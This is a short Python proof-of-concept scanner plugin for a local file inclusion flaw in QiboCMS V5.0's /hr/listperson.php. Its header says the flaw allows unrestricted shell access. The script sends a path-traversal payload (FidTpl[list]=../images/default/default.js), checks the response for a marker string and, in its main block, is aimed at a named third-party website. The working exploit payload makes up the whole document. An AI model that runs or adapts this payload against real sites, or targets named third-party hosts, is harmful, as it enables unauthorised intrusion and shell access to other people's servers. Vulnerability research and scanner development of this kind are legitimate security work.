#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  QiboCMS V5.0 /hr/listperson.php 本地文件包含漏洞 POC & Exploit
References:  http://www.wooyun.org/bugs/wooyun-2015-081470
Author    :  foxhack
QQ        :  278563291
Desc      :  Qibocms /hr/listperson.php 系统文件包含致无限制Getshell
"""

def assign(service, arg):
    if service == "qibocms":
        return True, arg

def audit(arg):
    url = arg
    payload = "FidTpl[list]=../images/default/default.js"
    file_path = "/hr/listperson.php?%s" % payload
    code, head, res, errcode, _ = curl.curl(url + file_path)
    #print res
    if code == 200:
    	if 'var evt = (evt) ? evt : ((window.event) ? window.event : "");' in res:
    		security_hole(url + file_path)
if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms', 'http://www.wuzhoumh.com/')[1])
